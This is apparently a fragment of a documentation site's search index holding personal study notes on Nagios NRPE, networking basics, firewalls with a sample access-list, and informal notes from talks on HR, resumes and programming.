<p>Nagios Remote plugin Executor (NPRE) allows you to execute Nagios pluging on Linux machines. You can monitor remote machines metrics</p> <p>NPRE     : check_npre      : NPRE dameon </p> <p>Nagios use port numbers 5666/7/8</p> <p>Monitoring host on 2 ways </p> <p>Actively      : Checks are intiated by nagios process == check logic by nagios dameon     : Checks are run on a regular scheduled basis</p> <p>Passively     : Checks are initiated and performed by external application/proccess     : Checks results are submitted to nagios for processing</p>"},{"location":"Networking/Basic/","title":"Basic","text":"<p>1.</p> <ol> <li>Define unicasting, multicasting and broadcasting</li> </ol> <p>\u2022 Data is transmitted over a network by three methods such as unicast, multicast and broadcast \u2022 Information is sent from a single user to a single receiver. This is used for point to point communications. If you have to send information to multiple receivers, then you would have to send multiple unicast messages \u2022 In this mode of communication, data is sent from one or more sources to multiple destinations. Multicast uses the internet group managament protocol to identify groups \u2022 It is known as to 1 to all. The communication is between a single user and multiple receiver</p> <p>What is DNS? Domain Name System. It is like internet's phone book that is responsible for mapping the domain name into its corressponding IP address</p> <p>What is firewall? Firewall is a hardware or software that is responsible for blocking either incoming or outgoing traffic from the internet to your computer. They secure a network</p> <p>Types of Firewall</p> <ol> <li>Packet Filtering firewalls They are the most common type of firewalls which analyze packets and let them pass through only if they match an estbablished secuirty rule set Proxy firewall</li> <li>These firewalls filter network traffic at the application level</li> </ol> <p>Stateful multilayer inspection (SMLI) firewalls * They filter packets at the network, transport and application layers. The packets are compared to the known trusted packets * Virtual private network is a connection between a VPN server and a vpn client. It is secure tunnel across the internet</p> <p>\u2022 Distributed processing is a term which describes various computer systems that use more that one processor to run the application. Here multiple computers across different locations share the same processor. </p> <p>Advantages of Distributed processing are \u2022 Data recovery \u2022 Lower cost \u2022 Reliable \u2022 Easy to expand * If there is loss of data in one computer, then it can be recovered by another interconnected computer * A glitch in one machine does not affect the processing as there will be multiple other machines * Several cost-effective minicomputers are used instead of costlier mainframe machines</p> <p>Domain \u2022 It is centralized network model \u2022 One administrator manages the domain and its resources \u2022 Good for large networks \u2022 The computer can be connected to any network Workgroup \u2022 It is a decentralized network \u2022 Every user manages the resources individully on their PCs \u2022 Good for small network \u2022 All the computer should be connected to the same LAN Data encapsulation refers to the process of adding header and trailers to the data. The data link layer binds each packet into a frame that contains the hardware addressof the source and the destination computer * A router masks the local IP address of each device and uses a single IP address when communicating with hardware outside the local network LAN  Advantages \u2022 Single central control unit, used to store system data \u2022 Transfer of data and information becomes easier and sharing network services</p> <p>Disadvantages \u2022 Data secuirty is compromised if the LAN admin decided to steal data and information \u2022 Require constant for continuing data dirstirbuting hardware</p> <p>Metropolitan Area Network (MAN)  is a network type that encompasses network connection of an entire city, or connection of a small area. The area covered is less in comparison to WAN and faces moderate network traffic in the channel * MAN covers a large geographical area and is also used as an ISP(Internet Service Provider), and the connection medium is generally wired for efficient data transfer * MAN applies many networks devices for smooth data services and is connected through telephone lines, to provide high-speed internet services</p> <p>Advantages  \u2022 Apply fiber optic cables for high speed data transfer \u2022 Connection area covers at most an entire city, or some parts of it. It also allows full duplex data exchange</p> <p>Disadvantage \u2022 Need for good qaulity hardware and cost of installing is very high</p>"},{"location":"Networking/FIrewall/firewall/","title":"Firewall","text":"<p>NAT =  Source NAT      = Outgoing Traffic Destination NAT = Incoming Traffic</p> <p>Firewall Zones</p> <p>Inside (Private System) DMZ (Semi Protected Area) Outside (Unprotected Networks)</p> <p>firewall are used to control traffic between zones</p> <p>Layer 4 - Protocol and port Layer 3 - Source and destination IP addresss Rules - Processed from top to down Rules order is important Last rule denies all</p> <p>example :     access-list 100 permit tcp any host 192.0.0.1 eq 25     access-list 100 permit tcp any host 192.0.0.1 eq 110     access-list 100 deny ip any host 192.0.0.1     access-list 100 deny udp any any eq 53      access-list 100 permit ip any any</p> <p>Stateful firewall tracks connection state Response traffic is allowed Stateless firewall require rules in both direction</p> <p>Deep packet inspection Signatures must be upto date</p> <p>if 1 firewall doesnt catch:     another firewall</p> <p>if malware inside can stop the firewall</p> <p>third paty systems /Not firewall  Windows : Windows firewall Linux : iptables</p> <p>Host based firewall runs on the OS Reside in the attack surface Provide defense in depth</p> <p>IDS - Intrusion Detection System IPS - Intrusion Prevention System</p> <p>Signature Based     Strings of bytes matching known malware or known attack. Can be downloaded </p> <p>Behaviour Based     Determine normal baseline traffic     Watch for unusual traffic</p> <p>Firewall And DDOS</p> <p>VLAN segmentation</p> <p>Use different Segments for different security zones You can enforce rules on traffic between segements, not within segements</p> <p>Microsegmentation</p>"},{"location":"Networking/Networking1/Authentication%20Protocol/","title":"Authentication Protocol","text":""},{"location":"Networking/Networking1/Cable%20Standards/","title":"Cable Standards","text":""},{"location":"Networking/Networking1/Cloud%20Virtualization/","title":"Cloud Virtualization","text":""},{"location":"Networking/Networking1/Connectors/","title":"Connectors","text":""},{"location":"Networking/Networking1/Firewall/","title":"Firewall","text":""},{"location":"Networking/Networking1/IP%20Address%20method/","title":"IP Address method","text":""},{"location":"Networking/Networking1/IP%20Address/","title":"IP Address","text":""},{"location":"Networking/Networking1/MAC%20address/","title":"MAC address","text":""},{"location":"Networking/Networking1/Media%20Types/","title":"Media Types","text":""},{"location":"Networking/Networking1/Network%20Component/","title":"Network Component","text":""},{"location":"Networking/Networking1/Network%20Types/","title":"Network Types","text":""},{"location":"Networking/Networking1/Network%20Utilities/","title":"Network Utilities","text":""},{"location":"Networking/Networking1/Networking%20Issues/","title":"Networking Issues","text":""},{"location":"Networking/Networking1/Networking%20Saftey%20%26%20Tools/","title":"Networking Saftey & Tools","text":""},{"location":"Networking/Networking1/OSI%20model/","title":"OSI model","text":""},{"location":"Networking/Networking1/Optimization%20%26%20Fault%20Tolerance/","title":"Optimization & Fault Tolerance","text":""},{"location":"Networking/Networking1/Ports/","title":"Ports","text":""},{"location":"Networking/Networking1/Remote%20Access%20Protocol%20Services/","title":"Remote Access Protocol Services","text":""},{"location":"Networking/Networking1/Routing%20Protocol/","title":"Routing Protocol","text":""},{"location":"Networking/Networking1/SOHO%20Routers/","title":"SOHO Routers","text":""},{"location":"Networking/Networking1/Security%20Protocol/","title":"Security Protocol","text":""},{"location":"Networking/Networking1/Subnetting/","title":"Subnetting","text":""},{"location":"Networking/Networking1/TCP%20IP%20protocol/","title":"TCP IP protocol","text":""},{"location":"Networking/Networking1/Topologies/","title":"Topologies","text":""},{"location":"Networking/Networking1/Troubleshooting/","title":"Troubleshooting","text":""},{"location":"Networking/Networking1/Vlan%20%26%20Intranet%20Extranet/","title":"Vlan & Intranet Extranet","text":""},{"location":"Networking/Networking1/WAN%20Technology/","title":"WAN Technology","text":""},{"location":"Networking/Networking1/Wireless%20Technologis/","title":"Wireless Technologis","text":""},{"location":"Networking/Networking1/Wiring%20Distribution/","title":"Wiring Distribution","text":""},{"location":"Networking/Networking1/Wiring%20Standard/","title":"Wiring Standard","text":""},{"location":"Networking/Networking2/BIOS%20CIMOS/","title":"BIOS CIMOS","text":""},{"location":"Networking/Networking2/CPU%20Socket/","title":"CPU Socket","text":""},{"location":"Networking/Networking2/Connectors/","title":"Connectors","text":""},{"location":"Networking/Networking2/Cooling/","title":"Cooling","text":""},{"location":"Networking/Networking2/Input%20Devices%20%26%20Peripherals/","title":"Input Devices & Peripherals","text":""},{"location":"Networking/Networking2/Mobile%20Issues/","title":"Mobile Issues","text":""},{"location":"Networking/Networking2/Modem%20vs%20Routers/","title":"Modem vs Routers","text":""},{"location":"Networking/Networking2/Monitors/","title":"Monitors","text":""},{"location":"Networking/Networking2/Power%20Supply/","title":"Power Supply","text":""},{"location":"Networking/Networking2/Printers/","title":"Printers","text":""},{"location":"Networking/Networking2/RAID/","title":"RAID","text":""},{"location":"Networking/Networking2/RAM%20Slots/","title":"RAM Slots","text":""},{"location":"Networking/Networking2/RAM/","title":"RAM","text":""},{"location":"Networking/Networking2/Storage%20Devices/","title":"Storage Devices","text":""},{"location":"Networking/Networking2/Subnet%20vs%20VLAN/","title":"Subnet vs VLAN","text":""},{"location":"Talks/Low%20Level/","title":"Low Level","text":"<p>learning C is great it have basic things, how memeory allocation work no smart pointers, very powerful</p> <p>embedding in rust is dangerous whne have to change to multiple scripts</p>"},{"location":"Talks/HR/1/","title":"1","text":"<p>The purpose of the HR of the company is to protect the company from lawsuits not to protect you Any complaint will eventually go to the boss and will try to protect potential lawsuits from the company If you have  Only gray hair can have for executives \"We are like a family\" We work hard play hard... most of the time work days are busy and weekends used to play... or no play at all If you are working with female co workers should always note down what did. sexual abuse will throw for nothing Never take long vacations. they will realize they can work without you You are replacable. Not want to work here</p> <p>Removing people takes time due to laws and paperwork  Some projects are destined to fail There is a reason tolerating bad worker in the office If they ask about the performance of the other person ; manager will think what they going about them Removing a person who complains about other people is fast</p>"},{"location":"Talks/HR/Resume/","title":"Resume","text":"<p>Make the resume filled in 1 page Include words from job description Remove word \"I\" Online links Experience title demonstrate values Does your 1st item in your resume demonstrate what they are looking No buzzword describing how great are you -- do not tell recruiter to what to think about us Action words Measure everything in terms of impact, not by responsibility, dont describe action ; results [  numbers] Technical skills should what they are looking for  Only put items that recuriter is care about  No typos or bad grammar</p> <p>If I am 100% knows about the job role do I have even apply for the job? Some jobs post hire requirements for avoiding junior people</p> <p>Small projects are good for learning, but can't show : BIG PROJECTS (1-2)</p>"},{"location":"Talks/Pirate%20Software/11/","title":"11","text":"<p>You don't need enery drink because you are sitting on a chair whole day</p> <p>Reasons to build a game engine     1. To learn     2. To add something missing     3. Ego (X)</p> <p>Your boss should at all time give feedback on both positive and negative</p>"},{"location":"Talks/PrimeTime/1/","title":"1","text":"<p>Project should always run on 1 way</p> <p>Premature optimization doesnt mean write bad code it measn write good code in language like c and then do down like assembly. If you write bad code in an application, you cant just point to 1 single functionality in app, the whole app is bad</p> <p>Benchmarking language using a simple task is bad it should always compare with big projects</p> <p>Dont use javascript for measuing performance in microseconds! Javascript engine intentially give wrong time results because of threat of hackers.</p> <p>Team of google called V8 optimized javascript to run 100 faster, so it run on servers. Are they good or bad guys! Bun is not in Zig. Yes or no. Javascript is the core</p> <p>function into a for loop. Big time</p> <p>Install Arch linux This is show what computer does at a little lower level and how modular computing enviornment works</p> <p>Finding things annoy me</p> <p>Smart Work</p> <p>If there is 1 thing that I want tell you, until no one else stay here to listen to me Smart work not hard work is the dumbest idea ever. First you do not know what is smart work to implemement it You learn by reinventing the wheel Unltimately smart work doesnt mean work less hours</p> <p>Side Projects</p> <p>What side projects do I want build to get a job? Hold on, that is short sighted question and this is why When you say something like that goal is so practical that go to point A to point B but dont live your life, but dont live your life that super hyper practical nature Shoot for something bit bigger  How do I became good engineer, better engineer , the best engineer  try to do something wonderful  Never Loss that child like nature  What do children do they shoot for moon  They dont focus on 1 step  Dont focus on small steps  Accompolish something awesome</p> <p>Perfection</p> <p>You made a code then you go back and refactor it /// Dont make the perfection be the reason of progress</p>"}]}